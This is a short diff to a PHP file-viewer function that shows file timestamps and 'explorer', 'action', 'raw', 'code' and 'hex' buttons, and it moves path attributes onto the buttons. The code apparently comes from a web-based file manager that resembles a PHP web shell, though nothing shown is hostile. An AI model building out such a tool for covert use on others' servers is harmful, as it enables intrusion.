@@ -534,7 +534,6 @@ if(!function_exists('view_file')){
 				else $type = "raw";
 			}
 
-			$content = "";
 			if($type=="code"){
 				$hl_arr = array(
 							"hl_default"=> ini_get('highlight.default'),
@@ -597,9 +596,9 @@ if(!function_exists('view_file')){
 	<tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($file))."</td></tr>
 	<tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($file))."</td></tr>
 	<tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($file))."</td></tr>
-	<tr data-path='".html_safe($dir)."'><td colspan='2'>
-	<span class='navigate button' style='width:120px;'>explorer</span>
-	<span class='action button' style='width:120px;'>action</span>
+	<tr><td colspan='2'>
+	<span data-path='".html_safe($dir)."' class='navigate button' style='width:120px;'>explorer</span>
+	<span data-path='".html_safe($file)."' class='action button' style='width:120px;'>action</span>
 	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">raw</span>
 	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'code');hide_box();\">code</span>
 	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'hex');hide_box();\">hex</span>
